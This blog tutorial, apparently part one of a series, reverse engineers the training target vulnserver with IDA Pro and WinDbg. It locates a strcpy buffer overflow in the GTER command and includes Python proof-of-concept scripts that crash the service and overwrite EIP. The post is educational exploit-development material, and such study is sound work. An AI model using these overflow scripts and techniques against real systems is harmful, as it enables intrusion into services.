---
layout: single
title: '[VulneServer] - Exploitation Part 1 - Reverse Engineering vulnserver using IDA'
description: 'This blog post shows how to reverse engineer vulneserver to find a buffer overflow issue in GTER command'
date: 2021-05-15
classes: wide
comments: false
header:
  teaser: /assets/images/avatar.jpg
tags:
  - IDA Pro
  - WinDbg
  - Reverse Engineering
  - Vulnserver
  - Exploit Development
  - API Monitor v2 32-bit
--- 


<p align="justify">
This article is the first part of an exploit development series regarding the exploitation process of the GTER command of the vulnserver executable. Furthermore, at this article we will analyse the vulnserver executable using WinDbg debugger assisted with reverse engineering techniques using IDA Pro disassembler/decompiler, in order to understand how the binary works as well as to search for vulnerabilities that may lead to exploitation. In this article we will not be focusing on fuzzing techniques, but rather we'll focus in reverse engineering techniques. 

<br><br>
The tools used for this demonstration are the following</p>

* IDA Pro

* API Monitor v2 32-bit

* WinDbg

Starting our binary analysis, we run API Monitor v2 in order to have a first site about how to perform communication with the vulnserver. 

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="/Users/xenovas/Documents/xen0vas.github.io/assets/images/2021/04/apimonitor.png" alt="APIMonitor" width="950" height="343" />

<p align="justify">
As we can see at the image above, when we run vulnserver, we have an overview of the socket functions that we expect. According to msdn, the <b>getaddrinfo</b> function provides protocol-independent translation from an ANSI host name to an address. Following, is the prototype of the <b>getaddrinfo</b> function.</p>

```C
INT WSAAPI getaddrinfo(
  PCSTR           pNodeName,
  PCSTR           pServiceName,
  const ADDRINFOA *pHints,
  PADDRINFOA      *ppResult
);

```

<p align="justify">
As we see above, the second argument is a pointer to a NULL-terminated ANSI string that contains either a service name or port number which is represented as a string.

Similar information regarding the port number we also get from the <b>ntohs</b> function, which,  in general terms and according to MSDN, converts a <b>u_short</b> from TCP/IP network byte order to host byte order (which is little-endian on Intel processors). The <b>ntohs</b> function can be used to convert an IP port number in network byte order to the IP port number in host byte order. Following, is the prototype of the <b>ntohs</b> function

```C
u_short ntohs(
  u_short netshort
);
```

Having this information, we can confirm that the server listens on port 9999. As we see below, we are running netcat tool to connect to port 9999</p>

<script id="asciicast-mkwzV0kymb3F0BmRStGe45boN" style="display: block;margin-left: auto;margin-right: auto;" src="https://asciinema.org/a/mkwzV0kymb3F0BmRStGe45boN.js" async></script>

<p align="justify">
As we see, there are some commands used by the vulnserver that need more investigation. At this point we will perform some research regarding the functionality of vulnserver. We will be using the following poc script in order to send some junk data to the vulnserver.   

</p>

```python 
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.201.9"
port = 9999

buffer = "A"*5000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send(buffer)
print s.recv(1024)
s.close()
```

<p align="justify">
At this point we are ready to run the script above in order to observe the functional behaviour of the vulnserver. For this reason we will be using windbg and IDA Pro. First we will run vulnserver on the target machine and then we will start IDA and attach Windbg as seen below  
</p>

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{baseUrl}}/assets/images/2021/04/attachwindbg.png" alt="Windbg_Attach_On_IDA" width="650" height="443" />

<p align="justify">
After attaching the vulnserver process to WinDbg we will be ready to start debugging. As we saw earlier, the application when starts, it binds to a specific port where it listens for incoming connections. All the related functions used to implement the raw socket connection is refered at the <b>ws2_32.dll</b> module. Specifically, one interesting function is <b>recv</b>, which according to msdn has the following prototype, 

```c
int recv(
  SOCKET s,
  char   *buf,
  int    len,
  int    flags
);
```

The <b>recv</b> function is the first entry point that will be used from the vulnserver in order to receive the bytes coming from the user input. At this point we will put a breakpoint at the <b>recv</b> function as follows 
</p>

<p align="justify">
We start by seting a breakpoint at the <b>recv</b> function using the command <code><b>bp ws2_32!recv</b></code>
</p>

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/04/breakpoint-ws2_32.png" alt="bp-ws2_32" width="450" height="143" />

<p align="justify">
Once we run the poc script, we immediately hit the breakpoint in <b>WinDbg</b> which is set at <b>recv</b> function inside the <b>ws2_32.dll</b> module. 
</p>


<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/04/windbg-bp-recv.png" alt="bp-windbg-hit" width="650" height="243" />

<p align="justify">
Moreover, <b>recv</b> function is not of much interest at this time, so we will continue execution until return from <b>recv</b> function. After returning from <b>recv</b> we will land to the address <code>0x00401958</code>
</p>

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/04/landing-address.png" alt="bp-windbg-hit" width="750" height="400" />

<p align="justify">
Now, lets try to understand the code portion marked with the red square as seen at the screenshot above. First, <b>esp</b> register will reserve some space on the stack, specifically <b>10h</b> ( 16 bytes in decimal ), in order to put there the value pointed at the address referred at <b>[ebp-410h]</b> , which moved there using the <code>mov [ebp-410h], eax</code> instruction. The hex value 0x1000 that stored onto the stack at the address <b>0x0103fb60</b> is the return value of the <b>recv</b> function, which shows clearly that 4096 bytes have been written to the buffer, and this also indicates that there are data coming from user input. 

So, as we now see at WinDbg debugger the value <b>0x1000</b> is stored in address <b>0x0103fb60</b> on the stack. 
</p>

```
WINDBG>dd ebp-410h L1
0103fb60  00001000
```

<p align="justify">
Then the instruction <code>cmp dword ptr [ebp-410h], 0</code> will compare the value pointed by <b>[ebp-410h]</b>, with value <b>0</b>, and if the value is less than or equal to <b>0</b>, then the program flow should be redirected to the location <b>loc_4024B6</b>. Also, as we see at the screenshot below, if there is a redirection of the execution flow to the location <b>loc_4024B6</b>, the connection with the <b>vulnserver</b> would be closed. 
</p>

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/04/loc_4024B6.png" alt="loc_4024B6" width="650" height="243" />

<p align="justify">
At this point we won't be redirected to <b>loc_4024B6</b>, and the execution flow will continue as is. If no data returned from <b>recv</b> function, then the socket connection would be closed. The following graph from IDA depicts the case where the execution flow would be redirected to the location <b>loc_4024E8</b> ,following the termination of the socket connection. 
</p>

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/04/Graph-loc_4024B6.png" alt="loc_4024B6" width="650" height="243" />


<p align="justify">
Now, lets explain the following code portion inside the red square as seen at the screenshot below.    
</p>

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/04/landing-address-2.png" alt="bp-windbg-hit" width="750" height="400" />

<p align="justify">
As we see at the assembly code above, some values are placed on the stack in order to be placed at the <b>strncmp</b> function as arguments later. One interesting instruction we see on IDA is the <code>call near ptr unk_402Db8</code>. This instruction specifies a near call to a relative address of the next instruction that as we see below it contains a jmp instruction to an offset which points to <b>msvcrt_strncmp</b> function. 
</p>

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/04/strncmp.png" alt="bp-windbg-hit" width="650" height="300" />


<p align="justify">
Specifically, the immediate value 5 is placed on the stack at address referred by <code>[esp+8]</code> which indicates the length of the <b>"HELP "</b> command including the white space. Then the <b>"HELP "</b> string is placed on the stack at an address referred by <code>[esp+4]</code>. then the string from user input will be places on the stack at position referred by <code>[ebp-10h]</code>. 
<br><br>
Lets see the arguments of <b>strncmp</b> function in WinDbg 
<br><br>
Below we see the address that holds the immediate value 0x5 on the stack
</p>

```
WINDBG>dc esp+8 L1
00edf9d0  00000005  
```
The second argument ( the string ( "HELP ")

```
WINDBG>dc 00404244 L2
00404244  504c4548 00000020                    HELP ...
```

The third argument ( the user input )

```
WINDBG>dc poi(ebp-10h)
00cd48e0  52455447 41414120 41414141 41414141  GTER AAAAAAAAAAA
00cd48f0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00cd4900  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00cd4910  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00cd4920  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00cd4930  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00cd4940  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00cd4950  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
[..SNIP..]
```

<p align="justify">
Afterwards, when the arguments placed on the stack, a call to <b>strncmp</b> function is done, which then returns the hex value <b>0xFFFFFFFF</b> on <b>eax</b> register as seen in WinDbg output below
</p>

```
WINDBG>r
eax=ffffffff ebx=00000100 ecx=00000048 edx=00000000 esi=00401848 edi=00401848
eip=004019f1 esp=0109f9c8 ebp=0109ff70 iopl=0         nv up ei ng nz ac pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000297
vulnserver+0x19f1:
004019f1 85c0            test    eax,eax
```

<p align="justify">
The returned value stored at <b>eax</b> is an indicator that the two strings are not equal. If we want to inspect the results further, we can observe the global flags <b>CF</b> and <b>ZF</b> on IDA Pro. Specifically the <b>CF</b> flag has the value 1 and the <b>ZF</b> has the value 0 which indicates that the source string ( the user input ) is bigger than the destination string ( src > dst ). 
</p>

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/04/return-strncmp.png" alt="bp-windbg-hit" width="350" height="350" />

<p align="justify">
At this point as we also see at the image below the execution flow will be forwarded to the location <b>loc_4019D6</b> 
</p>

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/04/4019d6.png" alt="bp-windbg-hit" width="650" height="350" />

<p align="justify">
Afterwards, when the comparison with <b>"HELP"</b> won't match, we will land to the location <b>loc_401A4B</b>. At this point we see that there is also a string comparison with  <b>"STATS"</b> and then, if there is again no match, the same code pattern will be repeated at the next code portion in order to compare with the string <b>"RTIME"</b>, and so on and so forth, until all vulnserver commands will be checked. 
</p>

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/04/rtime.png" alt="bp-windbg-hit" width="650" height="350" />

<p align="justify">
At this point we realize that there is a pattern of string comparison with all possible commands offered by the vulnserver. Specifically, the execution flow will continue in the same way until we match the string <b>"GTER"</b>. From the following WinDbg output, we see that the <b>eax</b> register holds tha value 0x00000000, which is the return value from <b>strncmp</b> function and indicates that there is a match with <b>"GTER"</b> string.    
</p>

```
eax=00000000 ebx=00000100 ecx=0040444e edx=00000005 esi=00401848 edi=00401848
eip=00401fe9 esp=00e6f9c8 ebp=00e6ff70 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
vulnserver+0x1fe9:
00401fe9 0f85aa000000    jne     vulnserver+0x2099 (00402099)            [br=0]
```

At this point we will not take the jump (JNE) to address <b>0x00402099</b> on the stack. Alternatively, the execution flow will continue to address <b>0x00401FEF</b> as seen at the image below. 

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/04/GTER.png" alt="bp-windbg-hit" width="650" height="550" />

At this point as we see at the following screenshot that there is a call to malloc function ( <b>loc_402DC0</b> ), which allocates 180 bytes (0xb4). 

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/04/malloc-1.png" alt="bp-windbg-hit" width="700" height="40" />

If we follow the <b>loc_402DC0</b>, we will see that there is a jump to the offset <b>off_406198</b> which indicates the call to malloc as seen at the image below 

 <img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/04/malloc-2.png" alt="bp-windbg-hit" width="700" height="100" />

After some instructions, we see that there is a call to <b>loc_4017CE</b> 

 <img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/04/strcpy-1.png" alt="bp-windbg-hit" width="700" height="100" />

If we continue the execution we see the following code 

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/04/strcpy-2.png" alt="bp-windbg-hit" width="500" height="200" />

<p align="justify">
After some instructions, we see at the address <b>0x004017D7</b>, when the <code><b>mov eax, [ebp+8]</b></code> executes, the <b>eax</b> register holds the user input, which will be copied using the <b>strcpy</b> function. The remaining 4820 bytes that sent from the poc script will be cut off because the copy to the destination exceeded the memory boundaries that have been set using the malloc function before.   
</p>

```
WINDBG>dc eax L30
00ce48e0  52455447 41414120 41414141 41414141  GTER AAAAAAAAAAA
00ce48f0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00ce4900  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00ce4910  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00ce4920  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00ce4930  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00ce4940  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00ce4950  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00ce4960  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00ce4970  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00ce4980  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00ce4990  41414141 00000000 3df6ae3b 00002a68  AAAA
```

then, the function <b>strcpy</b> will be called using the instruction <code><b>call loc_402DC8</b></code>


<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/04/strcpy-3.png" alt="bp-windbg-hit" width="700" height="150" />


at this point, if we continue the execution, the program will crash, and the following screenshot will be provided at the stack view in IDA Pro. 

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/04/stack-view.png" alt="bp-windbg-hit" width="350" height="500" />

Now that we know the presence of a buffer overflow vulnerability, we should coninue further and write a poc script in order to control the <b>EIP</b> register. As we also see at the stack view in IDA Pro, when the program crashed, the stack pointer ( <b>esp</b> resister ) stopped at the address <b>0x00EAF9C8</b>. With this in mind, we will create the following poc sctipt 


```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.201.9"
port = 9999

buffer = "A"*151 + "B"*4 + "C"*20

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GTER " + buffer)
print s.recv(1024)
s.close()
```

If we execute the above script, we will see that we control the EIP register.

``` 
WINDBG>r
eax=012cf928 ebx=00000100 ecx=00ec4998 edx=00000000 esi=00401848 edi=00401848
eip=42424242 esp=012cf9c8 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
42424242 ??              ???
```

We also see the same results in IDA Pro as follows 

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/04/RIP.png" alt="bp-windbg-hit" width="350" height="300" />

At this point we can continue with the exploitation of the buffer overflow vulnerability in order to gain a shell. All of these will be shown at a second part of this article.   






